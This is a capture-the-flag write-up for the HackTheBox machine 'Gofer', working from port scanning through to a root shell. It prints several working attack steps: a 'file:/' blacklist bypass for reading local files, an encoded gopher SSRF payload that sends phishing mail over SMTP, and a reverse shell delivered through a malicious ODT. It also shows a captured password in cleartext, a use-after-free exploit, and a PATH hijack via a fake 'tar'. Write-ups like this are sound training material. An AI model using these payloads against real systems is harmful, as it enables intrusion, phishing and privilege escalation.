# [Gofer](https://app.hackthebox.com/machines/Gofer) - 04/09/2023 - HackTheBox write-up

IP:   10.10.11.225
Name: gofer.htb

## User flag

### Discovery

Nmap:
```
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  filtered smtp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-ds
```

There is nothing on the first web page. By running `gobuster` in `vhost` mode we can find another app: `proxy.gofer.htb`. But, there is a Basic authentication to access the page.

In the same time, we can find a file in a shared directory accessible as a guest via SMB. The file is a mail:
```
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

Here we can find that Jocelyn is potentially vulnerable to phising attack, and also the proxy is probably restricted by Basic authentication using the `<Limit>` directive in Apache. This directive apply for a list of HTTP methods so we can try other HTTPs methods.

The GET and HEAD methods are indeed restricted by authentication, but not the others (ex: POST). So, I ran a `dirsearch` again using POST method, and found a `index.php` page:
```bash
$ curl -X POST http://proxy.gofer.htb/index.php
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
```

We need to send an `URL` parameter. In the body the parameter isn't use so we need to send it as a GET parameter (in lowercase also):
```
$ curl -X POST http://proxy.gofer.htb/index.php\?url\=http://10.10.11.225
# Redirection to gofer.htb page
```

### Searching for vulnerability

This parameter must be vulnerable. We can reach our machine but can't do anything with it. Maybe we can use it with the `file` protocol to obtain LFI:
```
$ curl -X POST http://proxy.gofer.htb/index.php\?url\=file:///etc/passwd 
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: file:// !</body></html>
```

The word `file://` is blacklisted, but we can try with `file:/`:
```
$ curl -X POST http://proxy.gofer.htb/index.php\?url\=file:/etc/passwd 
<!-- Welcome to Gofer proxy -->
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]
jhudson:x:1000:1000:Jocelyn Hudson,,,:/home/jhudson:/bin/bash
jdavis:x:1001:1001::/home/jdavis:/bin/bash
tbuckley:x:1002:1002::/home/tbuckley:/bin/bash
ablake:x:1003:1003::/home/ablake:/bin/bash
```

And we got it, we can now read file from the server. I read the `.htpasswd` file to obtain Basic authentication access and maybe reuse this credentials somewhere. But, I cannot crack it, online or offline. After searching other interesting files on the server, I thought that it's not the correct way. The `url` parameter allow us to have a kind of SSRF, others protocols can be used.

### Exploitation

The `mail` file must be here for a reason, so we might use this and try to send a mail to Jocelyn (`jhudson` we found it in `/etc/passwd`), with a malicious `.odt` file to obtain code execution. I finally found a clue in the machine name, Gofer, who refers to the `gopher` protocol, and we can use it to send mail. To create a payload, we can use `gopherus.py` that generate payloads for many protocols.

The payload created is generic so we need to edit it a little and also encode IP in decimal format because `127` is blacklisted:
```
gopher://2130706433:25/xHELO
MAIL FROM:<tbuckley@gofer.htb>
RCPT TO:<jhudson@gofer.htb>
DATA
From: <tbuckley@gofer.htb>
To: <jhudson@gofer.htb>
Subject: message

<a href='http://10.10.14.168/file.odt>super file</a>


.
QUIT
```

We need to use CRLF at end of line and then encode it correctly to finally send it:
```
POST /index.php?url=gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ctbuckley@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ctbuckley@gofer.htb%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20message%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.168/file.odt>super%20file</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

And with this payload we receive a request on our server to `file.odt` ! Now it's time to create our malicious ODT.

I found [this](https://github.com/0bfxgh0st/MMG-LO) repo, clone it, and create a file with malicious code who will execute a Linux reverse shell. Then we need to start HTTP server and nc listener, run the command and wait for Jocelyn to open our document. After a few seconds, it happens, we obtain a reverse shell, and the user flag !

## Root flag

The previous part was hard, so I expected the root flag to be easier to find.

### Searching for elevating privileges

After add my SSH key to obtain stable connection, I ran `linpeas` and found an executable, owned by root, with SUID bit and execute by user in `dev` group. In `/etc/group` we find that `tbuckley` is part of this group, so we need to pivot first to his account. After running a few minutes the `pspy64` program I found the following:
```
2023/09/08 08:29:01 CMD: UID=0     PID=5912   | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti
```

The user `tbuckley` is connecting to the proxy using Basic authentication, and we can reuse this password to switch to his account.

### Exploitation

We can now run this program, `notes` and obtain the following :
```
tbuckley@gofer:/home/jhudson$ /usr/local/bin/notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================
```

It seems like a UAF vulnerable program as we can see in many CTFs. After importing it in Ghidra in my own machine I started to inspect the code, and indeed we can find a UAF vulnerability:
```C
case 3:
    if (user != NULL) {
        free(user)
        # missing instruction: user = NULL;
    }
    break;
```

When creating a user the program will check if we are `root` and if it's the case, will give us the role `admin` instead of `user`. If we are admin we can run code as `root` with option 8:
```C
case 8:
  if (user == (char *)0x0) {
    puts("First create an user!\n");
  }
  else {
    iVar2 = strcmp(user + 0x18,"admin");
    if (iVar2 == 0) {
      puts("Access granted!");
      setuid(0);
      setgid(0);
      system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
    }
    else {
      puts("Access denied: you don\'t have the admin role!\n");
    }
  }
```

So, we need to obtain a user with "admin" role. By using the UAF, if we create a user, the delete it and create a note, the `malloc` call will return a pointer to the last freed user structure. Since user is not free, when we'll asking for user information, the program will see that user still exists and read data from our note. So we can create a user, delete a user and then create a note with a precise content to write `admin` in the user role, in fact 24 bytes of anything and then "admin" (ex: `111111111111111111111111admin`).

Now we have our admin role, the last step is to execute a shell instead of the `tar` command. Very simple, the full path of `tar` isn't specified so we can create an executable, named `tar` in a writable directory, which will run a shell, and then add this directory to the beginning of the variable `PATH`.
```bash
$ echo '#!/bin/bash' > /tmp/tar
$ echo '/bin/bash -p' >> /tmp/tar
$ chmod u+x /tmp/tar
$ PATH="/tmp:$PATH" /usr/local/bin/notes
# Choice 1 : create user with any username
# Choice 3 : delete user
# Choice 4 : write a note (111111111111111111111111admin)
# Choice 8 : shell as root !
```

So we obtain a shell as root and can get the flag.
